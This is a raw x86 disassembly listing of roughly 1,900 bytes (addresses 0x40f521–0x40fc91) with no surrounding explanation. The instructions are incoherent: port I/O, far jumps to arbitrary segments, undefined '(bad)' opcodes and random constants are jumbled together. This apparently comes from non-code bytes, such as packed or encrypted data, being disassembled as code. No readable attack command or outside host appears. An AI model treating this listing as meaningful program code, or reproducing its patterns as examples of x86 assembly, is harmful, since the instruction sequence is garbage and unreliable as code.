  40f521:	mov    al,ds:0xd03cbaaf
  40f526:	xchg   ebx,eax
  40f527:	jmp    FWORD PTR [edi+0x38]
  40f52a:	out    0x98,al
  40f52c:	xor    DWORD PTR [ecx+edi*2],ebx
  40f52f:	cli    
  40f530:	loop   0x40f579
  40f532:	mov    eax,ds:0xd033c254
  40f537:	es add al,0x8
  40f53a:	mov    bl,0xf6
  40f53c:	cli    
  40f53d:	jg     0x40f54c
  40f53f:	int3   
  40f540:	cmp    eax,0x562048e1
  40f545:	out    0x21,al
  40f547:	fnstsw WORD PTR [bp+di+0x54]
  40f54b:	xor    eax,0x61
  40f54e:	outs   dx,BYTE PTR ds:[esi]
  40f54f:	adc    eax,0xbbb75ca6
  40f554:	lds    edi,FWORD PTR [ebx+0x5783aefa]
  40f55a:	out    0x85,al
  40f55c:	xadd   DWORD PTR [eax],edx
  40f55f:	add    BYTE PTR [ebp-0x74],bh
  40f562:	stc    
  40f563:	xor    DWORD PTR [ebx+0x6606e87e],0x82bb8be4
  40f56d:	pop    edi
  40f56e:	popf   
  40f56f:	out    dx,al
  40f570:	sub    ch,BYTE PTR [eax+0x5b]
  40f573:	out    dx,eax
  40f574:	and    DWORD PTR [ebx],esi
  40f576:	mov    DWORD PTR [ebx-0x49],0x2f70c193
  40f57d:	int    0x3e
  40f57f:	arpl   WORD PTR [edx+ecx*4+0x6a1a8ac5],sp
  40f586:	outs   dx,DWORD PTR ds:[esi]
  40f587:	popf   
  40f588:	stc    
  40f589:	and    esi,DWORD PTR [edx+0xe882644]
  40f58f:	pop    ds
  40f590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f591:	xor    dh,BYTE PTR [ebx+0x2]
  40f594:	imul   ecx,ecx,0x76
  40f597:	(bad)
  40f59a:	ja     0x40f603
  40f59c:	push   edx
  40f59d:	test   bl,ah
  40f59f:	xchg   ebp,eax
  40f5a0:	mov    bh,0x8f
  40f5a2:	xchg   esi,eax
  40f5a3:	es pushf 
  40f5a5:	stos   BYTE PTR es:[edi],al
  40f5a6:	test   al,0x57
  40f5a8:	(bad)  
  40f5a9:	jmp    0xeeb:0xca1587a2
  40f5b0:	xchg   ebx,eax
  40f5b1:	cs dec esi
  40f5b3:	inc    esp
  40f5b4:	mov    eax,ds:0xd7330d5d
  40f5b9:	sbb    esp,esp
  40f5bb:	and    al,0x7d
  40f5bd:	xchg   DWORD PTR [ebx],ebx
  40f5bf:	pop    edx
  40f5c0:	bound  eax,QWORD PTR [ecx]
  40f5c2:	ret    
  40f5c3:	xchg   esi,eax
  40f5c4:	mov    ecx,0x519ebd41
  40f5c9:	addr16 nop
  40f5cb:	int    0xdd
  40f5cd:	mov    al,0x7b
  40f5cf:	fbld   TBYTE PTR [esi+0x3b]
  40f5d2:	dec    eax
  40f5d3:	daa    
  40f5d4:	add    al,0x91
  40f5d6:	shufps xmm5,XMMWORD PTR [edx+ecx*8+0x564d8200],0xcc
  40f5df:	push   eax
  40f5e0:	jge    0x40f623
  40f5e2:	cmp    edi,DWORD PTR [ebp-0x25]
  40f5e5:	fcomp  QWORD PTR [ecx]
  40f5e7:	add    ebx,DWORD PTR [edi]
  40f5e9:	shr    BYTE PTR [eax],0x89
  40f5ec:	xchg   DWORD PTR [eax-0x11b61698],esp
  40f5f2:	dec    ebx
  40f5f3:	mov    al,ds:0x81730baa
  40f5f8:	pop    edx
  40f5f9:	in     eax,0x4c
  40f5fb:	mov    ebx,0xaa153f4e
  40f600:	lods   al,BYTE PTR ds:[esi]
  40f601:	ss stos DWORD PTR es:[edi],eax
  40f603:	push   eax
  40f604:	test   al,0x71
  40f606:	nop
  40f607:	lds    ebx,FWORD PTR [edx+0x47]
  40f60a:	imul   esi,DWORD PTR [edx-0x66],0x228a4953
  40f611:	aas    
  40f612:	push   ss
  40f613:	out    0xf2,al
  40f615:	loop   0x40f682
  40f617:	enter  0x6f22,0xbc
  40f61b:	push   0x59
  40f61d:	add    ecx,eax
  40f61f:	add    eax,0x454daeaa
  40f624:	or     DWORD PTR [ebp+0x4],0xffffffc5
  40f628:	mov    WORD PTR [eax+0x19],es
  40f62b:	test   edi,ebx
  40f62d:	push   ecx
  40f62e:	hlt    
  40f62f:	add    bh,dl
  40f631:	(bad)  
  40f632:	out    0x32,eax
  40f634:	int3   
  40f635:	ret    0x15
  40f638:	je     0x40f681
  40f63a:	lea    esp,ds:0xbec93fe3
  40f640:	add    al,0x83
  40f642:	and    DWORD PTR fs:[ebp-0x33114278],ecx
  40f649:	pop    es
  40f64a:	jno    0x40f670
  40f64c:	iret   
  40f64d:	nop
  40f64e:	pop    esp
  40f64f:	mov    ebx,0xf620638f
  40f654:	mov    edx,0x1b0921c3
  40f659:	bound  esi,QWORD PTR [esi-0x145c8551]
  40f65f:	pop    esp
  40f660:	fidiv  DWORD PTR [edx-0x7fbc9829]
  40f666:	aas    
  40f667:	jnp    0x40f6e1
  40f669:	adc    ebx,esp
  40f66b:	mov    dl,0x81
  40f66d:	icebp  
  40f66e:	pop    ebx
  40f66f:	call   0xb1fd:0x851cbf32
  40f676:	lock push ds
  40f678:	mov    al,0x2d
  40f67a:	push   edi
  40f67b:	retf   
  40f67c:	fldcw  WORD PTR [edi]
  40f67e:	pop    eax
  40f67f:	in     al,dx
  40f680:	inc    ebp
  40f681:	sbb    al,0x6b
  40f683:	(bad)  
  40f684:	jecxz  0x40f63c
  40f686:	push   ecx
  40f687:	mov    bl,0x31
  40f689:	or     DWORD PTR [edi+0x5e],esi
  40f68c:	mov    edi,0x8b54f667
  40f691:	push   edi
  40f692:	add    bl,BYTE PTR [ebx+0x14]
  40f695:	adc    al,0x56
  40f697:	adc    ah,BYTE PTR [esi+0x17b4dfff]
  40f69d:	in     al,dx
  40f69e:	or     edi,DWORD PTR [eax+0x4f]
  40f6a1:	cmp    dl,BYTE PTR [ebp-0x78ed7e5d]
  40f6a7:	sbb    al,0xe6
  40f6a9:	pop    eax
  40f6aa:	mov    di,0x9227
  40f6ae:	cs pop es
  40f6b0:	retf   0x9ed7
  40f6b3:	idiv   DWORD PTR [edx+0x74]
  40f6b6:	pop    edi
  40f6b7:	jo     0x40f6a0
  40f6b9:	out    0x93,al
  40f6bb:	or     al,0x92
  40f6bd:	cmp    al,0xb1
  40f6bf:	and    esp,DWORD PTR [ecx]
  40f6c1:	fist   WORD PTR [esi-0x79022b6b]
  40f6c7:	dec    eax
  40f6c8:	in     eax,dx
  40f6c9:	or     BYTE PTR [ebx],dl
  40f6cb:	add    ah,BYTE PTR [eax]
  40f6cd:	mov    dl,0x92
  40f6cf:	ins    DWORD PTR es:[edi],dx
  40f6d0:	and    DWORD PTR ds:0x85ea06fb,esi
  40f6d6:	mov    ds,WORD PTR [esi]
  40f6d8:	pop    ecx
  40f6d9:	clc    
  40f6da:	fbld   TBYTE PTR [ebp-0x1a]
  40f6dd:	es or  eax,0x26bc1454
  40f6e3:	cmp    ecx,DWORD PTR [esi]
  40f6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6e6:	adc    ch,al
  40f6e8:	je     0x40f6b9
  40f6ea:	ss cmp cl,bl
  40f6ed:	adc    al,0xfa
  40f6ef:	xor    cl,0x9c
  40f6f2:	in     eax,dx
  40f6f3:	adc    bh,BYTE PTR [eax-0x480f34a]
  40f6f9:	sbb    eax,0xaa62ab48
  40f6fe:	scas   eax,DWORD PTR es:[edi]
  40f6ff:	sbb    cl,BYTE PTR [edx]
  40f701:	xor    al,0x87
  40f703:	call   0x5c897069
  40f708:	inc    esp
  40f709:	(bad)  
  40f70a:	push   edi
  40f70b:	into   
  40f70c:	adc    al,0x8b
  40f70e:	xor    eax,0xac6d86f2
  40f713:	or     BYTE PTR [ecx],al
  40f715:	push   es
  40f716:	inc    ebp
  40f717:	inc    esi
  40f718:	dec    ebx
  40f719:	push   0xed4c71a2
  40f71e:	cmc    
  40f71f:	cwde   
  40f720:	test   DWORD PTR [ebx-0x1c],edi
  40f723:	mov    edx,0x9aca9031
  40f728:	in     al,0x9
  40f72a:	push   eax
  40f72b:	loop   0x40f793
  40f72d:	and    BYTE PTR [ebx+0x15],0x2b
  40f731:	ins    BYTE PTR es:[edi],dx
  40f732:	add    eax,0x1e6b5a6e
  40f737:	lds    edi,FWORD PTR ds:0xd4bf9256
  40f73d:	pop    ecx
  40f73e:	js     0x40f754
  40f740:	cmp    DWORD PTR [ebx+0x67],ebx
  40f743:	and    eax,0xeed506fc
  40f748:	pop    edx
  40f749:	adc    eax,0xc1c97f05
  40f74e:	jle    0x40f797
  40f750:	imul   BYTE PTR [ecx]
  40f752:	mov    ah,0x98
  40f754:	adc    dh,bl
  40f756:	jmp    0x40f710
  40f758:	add    ebx,DWORD PTR [eax-0x2841a3f0]
  40f75e:	pop    ds
  40f75f:	add    eax,0x5b5a53ea
  40f764:	mov    ah,0x67
  40f766:	mov    al,ds:0xa89ea332
  40f76b:	cmp    eax,ecx
  40f76d:	inc    cl
  40f76f:	mov    eax,ds:0xf9abe61a
  40f774:	lahf   
  40f775:	into   
  40f776:	addr16 and eax,0x50a9edeb
  40f77c:	xchg   esi,eax
  40f77d:	fld    DWORD PTR [ecx-0x591441ea]
  40f783:	sub    al,0xc2
  40f785:	loope  0x40f741
  40f787:	cld    
  40f788:	loope  0x40f7f6
  40f78a:	aas    
  40f78b:	cmp    eax,DWORD PTR [ecx+0x21]
  40f78e:	mov    al,ds:0x3b8b43fb
  40f793:	aam    0x88
  40f795:	(bad)  
  40f796:	fidivr WORD PTR [ebp+0x41]
  40f799:	frstor [eax-0x1c]
  40f79c:	stc    
  40f79d:	cld    
  40f79e:	das    
  40f79f:	ret    
  40f7a0:	loopne 0x40f774
  40f7a2:	fidiv  DWORD PTR ds:0xa57e1435
  40f7a8:	fisttp WORD PTR [eax-0x4b]
  40f7ab:	dec    eax
  40f7ac:	xchg   esi,eax
  40f7ad:	shl    BYTE PTR [edi],0xb
  40f7b0:	or     eax,0x9cadeb2d
  40f7b5:	sbb    DWORD PTR [ebx-0x3a8d8be9],0xca139f3c
  40f7bf:	jae    0x40f83d
  40f7c1:	scas   al,BYTE PTR es:[edi]
  40f7c2:	and    eax,0x52c75da6
  40f7c7:	les    esi,FWORD PTR [ecx]
  40f7c9:	ds push edx
  40f7cb:	adc    al,0xcc
  40f7cd:	les    edi,FWORD PTR [edx-0x78]
  40f7d0:	adc    eax,0xedbbd684
  40f7d5:	pop    esi
  40f7d6:	aas    
  40f7d7:	jo     0x40f7dc
  40f7d9:	aaa    
  40f7da:	in     al,dx
  40f7db:	pop    ss
  40f7dc:	xchg   DWORD PTR [ebp+0x20],esi
  40f7df:	mov    esp,es
  40f7e1:	retf   0x5b78
  40f7e4:	pop    edx
  40f7e5:	inc    ebp
  40f7e6:	jecxz  0x40f76f
  40f7e8:	(bad)  
  40f7ea:	sub    ch,ch
  40f7ec:	sub    BYTE PTR [ebx+eax*1-0x1f],dh
  40f7f0:	int3   
  40f7f1:	dec    eax
  40f7f2:	mov    ch,0xa3
  40f7f4:	lea    esp,[bx+di-0x7f8b]
  40f7f9:	inc    edx
  40f7fa:	or     al,0xce
  40f7fc:	neg    DWORD PTR [eax]
  40f7fe:	jne    0x40f7fd
  40f800:	loope  0x40f84c
  40f802:	adc    al,0x8
  40f804:	mov    bh,0x22
  40f806:	pop    ebx
  40f807:	fwait
  40f808:	sub    BYTE PTR [esp+eax*8+0x3071cd34],0xce
  40f810:	xlat   BYTE PTR ds:[ebx]
  40f811:	repnz cmp BYTE PTR ds:0xf735601,bl
  40f818:	repz daa 
  40f81a:	idiv   DWORD PTR [ebp-0x30]
  40f81d:	and    al,BYTE PTR ds:0x48388c
  40f823:	sub    dh,dh
  40f825:	jo     0x40f837
  40f827:	lods   eax,DWORD PTR ds:[esi]
  40f828:	daa    
  40f829:	iret   
  40f82a:	rol    DWORD PTR [edi+eax*1],0xbd
  40f82e:	cdq    
  40f82f:	jno    0x40f81f
  40f831:	rcr    DWORD PTR [ebp+0x61aae7bd],cl
  40f837:	ds push ebx
  40f839:	xor    DWORD PTR [edi+0x10],edi
  40f83c:	dec    edx
  40f83d:	push   esi
  40f83e:	jne    0x40f892
  40f840:	xchg   edi,eax
  40f841:	mov    ds:0x5ac313a,eax
  40f846:	gs test al,0x9a
  40f849:	inc    edi
  40f84a:	(bad)  
  40f84b:	sub    al,0xb6
  40f84d:	jmp    0x23ff:0xcf74e9ec
  40f854:	ins    DWORD PTR es:[edi],dx
  40f855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f856:	popa   
  40f857:	out    0x79,eax
  40f859:	xchg   BYTE PTR [ebx+ebx*8+0x2c],ch
  40f85d:	popa   
  40f85e:	push   eax
  40f85f:	les    edx,FWORD PTR [eax-0x7a986b01]
  40f865:	fnstenv [edx-0x51d6bb8a]
  40f86b:	sbb    eax,0x3b592420
  40f870:	jne    0x40f89e
  40f872:	xchg   ebx,eax
  40f873:	inc    ebx
  40f874:	xchg   ebx,eax
  40f875:	cmc    
  40f876:	adc    edx,DWORD PTR [esi+esi*8]
  40f879:	punpcklwd mm7,DWORD PTR [esi-0x15]
  40f87d:	and    bh,ch
  40f87f:	or     BYTE PTR [esi],dl
  40f881:	and    ah,dh
  40f883:	pop    es
  40f884:	ficom  DWORD PTR [ecx-0xabebb09]
  40f88a:	xchg   edi,eax
  40f88b:	mov    eax,ds:0xe7dd65e3
  40f890:	cmp    bh,al
  40f892:	dec    ebx
  40f893:	add    DWORD PTR [edx-0xd5d7fb5],eax
  40f899:	ins    DWORD PTR es:[edi],dx
  40f89a:	fdivr  st,st(4)
  40f89c:	icebp  
  40f89d:	rcl    DWORD PTR [ebp+0x1a],0xa4
  40f8a1:	fsub   st,st(6)
  40f8a3:	mov    ebx,0xa2a14545
  40f8a8:	add    dl,BYTE PTR [ebx]
  40f8aa:	xor    al,0x5a
  40f8ac:	sub    DWORD PTR [edx],eax
  40f8ae:	jl     0x40f88b
  40f8b0:	inc    ebx
  40f8b1:	add    ebx,DWORD PTR [ecx]
  40f8b3:	scas   eax,DWORD PTR es:[edi]
  40f8b4:	jno    0x40f8cd
  40f8b6:	(bad)  
  40f8b8:	sbb    al,0x27
  40f8ba:	sbb    BYTE PTR [edx-0x5972eade],bl
  40f8c0:	adc    BYTE PTR ds:0xb52bf1ad,al
  40f8c6:	test   eax,ecx
  40f8c8:	xchg   ebp,eax
  40f8c9:	jbe    0x40f88f
  40f8cb:	imul   ebx,DWORD PTR ds:0x82509944,0x9f0f25ea
  40f8d5:	and    DWORD PTR [ecx+eax*1-0x6a],edi
  40f8d9:	push   edx
  40f8da:	pushf  
  40f8db:	cs ins BYTE PTR es:[edi],dx
  40f8dd:	or     BYTE PTR [ebp+esi*1-0x88241b7],bl
  40f8e4:	mov    ebx,0x94d1759a
  40f8e9:	sbb    BYTE PTR [eax+0x2a50b150],ch
  40f8ef:	enter  0x3053,0xd0
  40f8f3:	jge    0x40f907
  40f8f5:	adc    eax,0x4e38c773
  40f8fa:	mov    al,ds:0xbbd95b4c
  40f8ff:	cli    
  40f900:	jne    0x40f90d
  40f902:	fs ds xchg esp,eax
  40f905:	push   eax
  40f906:	stos   BYTE PTR es:[edi],al
  40f907:	pop    ecx
  40f908:	jae    0x40f8e8
  40f90a:	fldenv [edi]
  40f90c:	xor    al,0xc3
  40f90e:	mov    cl,0xfd
  40f910:	push   es
  40f911:	add    bl,BYTE PTR [ebx+0x3913f03c]
  40f917:	sahf   
  40f918:	jnp    0x40f8ae
  40f91a:	jne    0x40f98c
  40f91c:	scas   al,BYTE PTR es:[edi]
  40f91d:	mov    ds:0xbeffad28,eax
  40f922:	inc    edi
  40f923:	imul   DWORD PTR [esi+0x1b40c0ea]
  40f929:	or     al,0x2e
  40f92b:	add    al,dh
  40f92d:	icebp  
  40f92e:	aaa    
  40f92f:	pop    ebp
  40f930:	push   ds
  40f931:	or     BYTE PTR [esi],al
  40f933:	jbe    0x40f8da
  40f935:	sub    ecx,edx
  40f937:	(bad)  
  40f938:	xchg   ebx,eax
  40f939:	mov    cl,0xad
  40f93b:	or     ebx,eax
  40f93d:	mov    ah,0x94
  40f93f:	jp     0x40f914
  40f941:	imul   ebx,DWORD PTR [eax],0x25
  40f944:	inc    edx
  40f945:	(bad)  
  40f946:	arpl   WORD PTR [ebx+0x7e],sp
  40f949:	rcr    DWORD PTR [ecx],cl
  40f94b:	xor    al,0xd8
  40f94d:	xchg   esp,eax
  40f94e:	push   esi
  40f94f:	sbb    eax,0x73d8fe53
  40f954:	call   0xc4e:0x795690f
  40f95b:	push   ds
  40f95c:	outs   dx,DWORD PTR ds:[esi]
  40f95d:	mov    ch,0xac
  40f95f:	clc    
  40f960:	sub    BYTE PTR [ebx+0x5],dl
  40f963:	dec    edx
  40f964:	and    eax,0x749c54c
  40f969:	mov    al,0xb2
  40f96b:	push   ebx
  40f96c:	std    
  40f96d:	xor    eax,0xae6ca124
  40f972:	ins    BYTE PTR es:[edi],dx
  40f973:	dec    edi
  40f974:	add    al,0xf6
  40f976:	test   eax,eax
  40f978:	fiadd  WORD PTR [edx+edx*4+0x46]
  40f97c:	mov    ds,WORD PTR [edi]
  40f97e:	inc    ebx
  40f97f:	push   ss
  40f980:	pushf  
  40f981:	add    BYTE PTR [eax-0x69],cl
  40f984:	or     al,0x3d
  40f986:	xor    eax,0xace6e4f
  40f98b:	sbb    DWORD PTR [esi-0x1],0x44
  40f98f:	daa    
  40f990:	jbe    0x40f993
  40f992:	mov    ch,0xbb
  40f994:	test   BYTE PTR [eax],0x2b
  40f997:	into   
  40f998:	fmul   QWORD PTR [esi-0x6]
  40f99b:	mov    dl,0x1
  40f99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f99f:	stos   DWORD PTR es:[edi],eax
  40f9a0:	repz sbb al,0xcc
  40f9a3:	shl    BYTE PTR [edx+ebx*8-0x3a],1
  40f9a7:	popf   
  40f9a8:	push   0xd092d8ab
  40f9ad:	cdq    
  40f9ae:	push   ebp
  40f9af:	iret   
  40f9b0:	jp     0x40f970
  40f9b2:	aas    
  40f9b3:	mov    dh,0xee
  40f9b5:	and    DWORD PTR [edi-0x48],eax
  40f9b8:	mov    esi,0xe0723b38
  40f9bd:	loopne 0x40f9ee
  40f9bf:	xor    DWORD PTR [eax+0x4c755fad],eax
  40f9c5:	pop    edi
  40f9c6:	push   ds
  40f9c7:	fcomp  QWORD PTR [edi-0x638a4aea]
  40f9cd:	sbb    DWORD PTR [edx+0x1ae2124],0x43
  40f9d4:	int    0xbb
  40f9d6:	add    bl,ch
  40f9d8:	xchg   ebx,eax
  40f9d9:	push   edi
  40f9db:	or     BYTE PTR [ecx+eiz*4-0x5f],dh
  40f9df:	mov    ds:0x5fb874bd,eax
  40f9e4:	(bad)  
  40f9e5:	fimul  WORD PTR [edx+0x74]
  40f9e8:	out    0xb5,eax
  40f9ea:	xor    dh,dl
  40f9ec:	push   esp
  40f9ee:	inc    ebx
  40f9ef:	loope  0x40f9d0
  40f9f1:	mov    dl,0x45
  40f9f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f4:	sbb    ecx,DWORD PTR [ecx]
  40f9f6:	repz sbb BYTE PTR [ebp-0x2a],dh
  40f9fa:	inc    esi
  40f9fb:	jae    0x40fa35
  40f9fd:	inc    edx
  40f9fe:	xchg   ebx,eax
  40f9ff:	dec    ecx
  40fa00:	sub    bh,BYTE PTR [edi-0x613220f1]
  40fa06:	dec    ecx
  40fa07:	mov    bh,0xbe
  40fa09:	retf   
  40fa0a:	cmp    eax,0x8d77f0b9
  40fa0f:	ds pushf 
  40fa11:	(bad)  
  40fa12:	push   edx
  40fa13:	cmp    ah,BYTE PTR [edx+0xbe035f7]
  40fa19:	pop    ebp
  40fa1a:	xor    al,BYTE PTR [edi]
  40fa1c:	call   DWORD PTR [esi+0x4e67c00]
  40fa22:	jl     0x40fa69
  40fa24:	mov    dh,0xb5
  40fa26:	xchg   BYTE PTR [edi-0x10],dh
  40fa29:	xchg   edx,eax
  40fa2a:	pop    ebx
  40fa2b:	jno    0x40fa28
  40fa2d:	leave  
  40fa2e:	jno    0x40fa1f
  40fa30:	mov    cl,0x19
  40fa32:	pop    ds
  40fa33:	jb     0x40f9ce
  40fa35:	das    
  40fa36:	adc    edi,DWORD PTR [edx-0x53a1a4fe]
  40fa3c:	or     edi,DWORD PTR [edx-0x48]
  40fa3f:	adc    al,0x28
  40fa41:	lods   al,BYTE PTR ds:[esi]
  40fa42:	sbb    DWORD PTR [ecx-0x16],edi
  40fa45:	dec    esi
  40fa46:	push   esi
  40fa47:	pop    ds
  40fa48:	mov    eax,0xde34fd9e
  40fa4d:	xchg   esi,eax
  40fa4e:	or     eax,0xd7068da1
  40fa53:	add    al,0x4
  40fa55:	popf   
  40fa56:	enter  0xc401,0xa8
  40fa5a:	aad    0x34
  40fa5c:	leave  
  40fa5d:	jbe    0x40f9ec
  40fa5f:	imul   esp,DWORD PTR [ecx-0x11a2fb4a],0x2feb87b2
  40fa69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa6a:	pop    ebx
  40fa6b:	pop    es
  40fa6c:	or     al,0x9
  40fa6e:	push   eax
  40fa6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa70:	js     0x40fa72
  40fa72:	jmp    0xf533:0x9858aa27
  40fa79:	mov    BYTE PTR [edi],0x1c
  40fa7c:	imul   ebx,DWORD PTR [edx-0x44ae1aa4],0x16
  40fa83:	pop    esp
  40fa84:	mov    ebp,0x9ea75f3c
  40fa89:	int3   
  40fa8a:	mov    esi,0x483e5df4
  40fa8f:	or     esp,DWORD PTR [ecx-0x56]
  40fa92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa93:	dec    ebp
  40fa94:	sub    BYTE PTR [esi-0x76b12328],0x38
  40fa9b:	out    dx,al
  40fa9c:	ret    
  40fa9d:	int    0xc7
  40fa9f:	mov    esp,0x7c082662
  40faa4:	(bad)  
  40faa5:	and    eax,0x9c8bc9ab
  40faaa:	push   ss
  40faab:	out    0x7e,al
  40faad:	shl    BYTE PTR ds:0xcd0a6644,1
  40fab3:	aas    
  40fab4:	adc    esp,DWORD PTR [edx+0x4fe47828]
  40faba:	xlat   BYTE PTR ds:[ebx]
  40fabb:	not    DWORD PTR fs:[ebx-0x7]
  40fabf:	test   BYTE PTR [esi+0x3189a075],ch
  40fac5:	dec    ecx
  40fac6:	sub    DWORD PTR [esp+edi*1-0x1a],esp
  40faca:	(bad)  
  40facb:	pop    ecx
  40facc:	xor    bh,dh
  40face:	test   DWORD PTR [eax],edx
  40fad0:	popa   
  40fad1:	cmp    al,0xc5
  40fad3:	inc    eax
  40fad4:	push   eax
  40fad5:	sbb    ebp,esp
  40fad7:	mov    bh,0xb
  40fad9:	mov    WORD PTR [ebx+0x3dcc6ee2],?
  40fadf:	pushf  
  40fae0:	dec    ecx
  40fae1:	xchg   edi,eax
  40fae2:	gs mov bl,0x37
  40fae5:	(bad)  
  40fae6:	jns    0x40fa6b
  40fae8:	push   cs
  40fae9:	push   0xffffffb5
  40faeb:	jmp    0x1a57:0x45836a6a
  40faf2:	pushf  
  40faf3:	mov    ecx,0xdbe2fb84
  40faf8:	jne    0x40fab1
  40fafa:	arpl   si,di
  40fafc:	pop    esi
  40fafd:	les    esi,FWORD PTR [edx]
  40faff:	test   BYTE PTR [ebx],al
  40fb01:	sub    cl,ch
  40fb03:	out    dx,al
  40fb04:	cmp    dh,al
  40fb06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb07:	adc    DWORD PTR [ebx],ecx
  40fb09:	mov    esp,0xf2e1a509
  40fb0e:	fwait
  40fb0f:	inc    edx
  40fb10:	mov    bh,0x7d
  40fb12:	jmp    0x571e:0x5bd9e031
  40fb19:	(bad)  
  40fb1a:	dec    esi
  40fb1b:	pushaw 
  40fb1d:	lods   al,BYTE PTR ds:[esi]
  40fb1e:	push   edi
  40fb1f:	mov    DWORD PTR ds:0x5ef89c9a,ebx
  40fb25:	cli    
  40fb26:	fstp   DWORD PTR [ecx+0x76]
  40fb29:	test   eax,0x28b8e4e3
  40fb2e:	jbe    0x40fba0
  40fb30:	mov    dl,0x9e
  40fb32:	not    BYTE PTR [esi+0x3b02e980]
  40fb38:	sbb    al,0x91
  40fb3a:	xor    DWORD PTR [eax],edx
  40fb3c:	push   edx
  40fb3d:	cmp    al,0x74
  40fb3f:	(bad)  [eax]
  40fb41:	jnp    0x40fb80
  40fb43:	std    
  40fb44:	adc    ch,BYTE PTR [ebp+0x7e]
  40fb47:	not    DWORD PTR [esi]
  40fb49:	add    edi,edi
  40fb4b:	(bad)  [ecx+0x264d46f7]
  40fb51:	(bad)  
  40fb52:	addr16 pop edx
  40fb54:	cmc    
  40fb55:	fsubr  QWORD PTR [ebp+edx*2+0x71]
  40fb59:	add    eax,0x7cceb34
  40fb5e:	or     eax,0xdcf91e86
  40fb63:	inc    ebp
  40fb64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb65:	xor    eax,0x2d71b33f
  40fb6a:	mov    ebx,0x478c1a14
  40fb6f:	bound  esp,QWORD PTR [edi-0x367c8c59]
  40fb75:	fbld   TBYTE PTR [ecx]
  40fb77:	add    eax,0xcb51fafa
  40fb7c:	rol    edx,0x24
  40fb7f:	nop
  40fb80:	popa   
  40fb81:	push   es
  40fb82:	fwait
  40fb83:	fs stos DWORD PTR es:[edi],eax
  40fb85:	mov    al,0x2f
  40fb87:	xchg   DWORD PTR [ebx-0x5815b1ed],ebx
  40fb8d:	add    DWORD PTR [ecx],edx
  40fb8f:	retf   0xbc0
  40fb92:	es cdq 
  40fb94:	jmp    0xb0a7d0ea
  40fb99:	mov    eax,ds:0xb070e885
  40fb9e:	mov    DWORD PTR [edi+0x764325],0xd7ff1cc3
  40fba8:	push   eax
  40fba9:	mov    al,0x2e
  40fbab:	add    edi,DWORD PTR ds:0x2aa1bef
  40fbb1:	mov    ebx,0x216b13e5
  40fbb6:	test   eax,0xaa0b222d
  40fbbb:	cmp    cl,BYTE PTR [edx-0x22]
  40fbbe:	(bad)  
  40fbbf:	cmc    
  40fbc0:	fdivrp st(3),st
  40fbc2:	push   esp
  40fbc3:	pop    eax
  40fbc4:	dec    eax
  40fbc5:	mov    fs,edx
  40fbc7:	imul   DWORD PTR [eax-0x41]
  40fbca:	or     al,0x99
  40fbcc:	mov    eax,ds:0x82726f81
  40fbd1:	les    edx,FWORD PTR [ebx-0x11c7fbe5]
  40fbd7:	add    ebp,ebx
  40fbd9:	test   DWORD PTR [edi-0x5d],ebx
  40fbdc:	dec    bh
  40fbde:	rol    al,cl
  40fbe0:	sub    DWORD PTR [edi],eax
  40fbe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe3:	xor    BYTE PTR [ecx-0x73],cl
  40fbe6:	add    BYTE PTR [edi+0x5d],al
  40fbe9:	mov    ebp,DWORD PTR [esi]
  40fbeb:	cld    
  40fbec:	test   eax,0x4b9077aa
  40fbf1:	cwde   
  40fbf2:	(bad)  
  40fbf3:	imul   ebp,ebp,0x37cde845
  40fbf9:	imul   BYTE PTR [edi+0x4e]
  40fbfc:	or     al,0xe9
  40fbfe:	sar    DWORD PTR [esi-0x665203c5],1
  40fc04:	push   0xffffff87
  40fc06:	call   0x296204c2
  40fc0b:	sub    DWORD PTR [ecx+0x49f6ef46],0xffffff91
  40fc12:	je     0x40fc1f
  40fc14:	leave  
  40fc15:	push   ss
  40fc16:	inc    ecx
  40fc17:	push   DWORD PTR [eax+0x46]
  40fc1a:	iret   
  40fc1b:	xor    eax,0x2ded5012
  40fc20:	mov    dl,0xce
  40fc22:	push   es
  40fc23:	xlat   BYTE PTR ds:[ebx]
  40fc24:	cld    
  40fc25:	imul   esi,DWORD PTR [ebx+ebp*2+0x14],0xffffff83
  40fc2a:	call   0xfaec7536
  40fc2f:	scas   al,BYTE PTR es:[edi]
  40fc30:	dec    edi
  40fc31:	dec    esp
  40fc32:	dec    esp
  40fc33:	mov    dl,0xbf
  40fc35:	into   
  40fc36:	mov    dl,0xa8
  40fc38:	inc    esi
  40fc39:	push   eax
  40fc3a:	sbb    al,0x62
  40fc3c:	ja     0x40fbe1
  40fc3e:	fistp  WORD PTR [edx+0x5114b22a]
  40fc44:	test   eax,0xc7012cf9
  40fc49:	jo     0x40fc2b
  40fc4b:	outs   dx,BYTE PTR ds:[esi]
  40fc4c:	rcr    DWORD PTR [edi],cl
  40fc4e:	(bad)  
  40fc4f:	xor    ecx,DWORD PTR [esi-0x3d]
  40fc52:	and    ah,ah
  40fc54:	inc    eax
  40fc55:	cmp    ch,al
  40fc57:	test   bh,dl
  40fc59:	aad    0x35
  40fc5b:	pop    ss
  40fc5c:	mov    ebp,0x77b4180a
  40fc61:	cmp    DWORD PTR [ebx+0x12e66ad6],esi
  40fc67:	bnd jp 0x40fcd5
  40fc6a:	mov    cl,0x74
  40fc6c:	jno    0x40fcb4
  40fc6e:	push   eax
  40fc6f:	dec    ebx
  40fc70:	mov    dl,0x11
  40fc72:	fdiv   QWORD PTR [esi-0x21]
  40fc75:	sub    DWORD PTR [edx+0x3933022b],edx
  40fc7b:	cmp    bh,BYTE PTR [edx]
  40fc7d:	xor    bl,BYTE PTR [ebp-0x51]
  40fc80:	mov    edi,0xa46ac224
  40fc85:	push   es
  40fc86:	mov    edx,0x58fb761f
  40fc8b:	inc    ch
  40fc8d:	xchg   esp,eax
  40fc8e:	inc    ebp
  40fc8f:	adc    dh,bl
  40fc91:	sbb    dl,BYTE PTR [edx-0x46693fb2]
